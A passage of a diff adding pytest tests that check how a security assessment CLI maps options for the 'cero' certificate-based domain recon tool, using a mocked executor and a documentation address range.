+    assert "cero" in cmd[2]
+    assert "-p" in cmd[2] and "443,8443,9443" in cmd[2]
+    # tool_name is preserved as `cero` for audit / list-command-runs lookups.
+    assert captured["kwargs"]["tool_name"] == "cero"
+
+
+def test_cero_only_domains_toggle_maps_to_dash_d(monkeypatch):
+    """F4 — `--only-domains` is the operator-facing name for cero's native `-d`
+    toggle (filter results to valid domain names only). argparse must NOT bind
+    `-d` directly because cero's `-d` is a toggle, not a target argument."""
+    cli = _import("assess.cli")
+    kali = _import("assess.lib.kali")
+
+    captured: dict = {}
+
+    def fake_kali_exec(cmd, **kwargs):
+        captured["cmd"] = list(cmd)
+        return kali.KaliResult(
+            run_id=1,
+            status="completed",
+            return_code=0,
+            stdout_path="/tmp/x.out",
+            stderr_path="/tmp/x.err",
+            duration_ms=10,
+            peak_rss_bytes=None,
+            stdout_preview="",
+            stderr_preview="",
+            timed_out=False,
+            partial_results=False,
+        )
+
+    mod = _import("assess.commands.kali_cero")
+    monkeypatch.setattr(mod, "kali_exec", fake_kali_exec)
+
+    cli.main([
+        "kali", "cero",
+        "--target", "198.51.100.0/24",
+        "--only-domains",
+        "--technique", "OSINT",
+        "--intent", "cero only-domains toggle",
+        "--probe-kind", "fingerprint",
+        "--phase", "recon",
+        "--timeout", "600",
+    ])
+    cmd = captured["cmd"]
+    assert cmd[0] == "cero"
+    assert "-d" in cmd  # the toggle, not a target
+    assert "198.51.100.0/24" in cmd
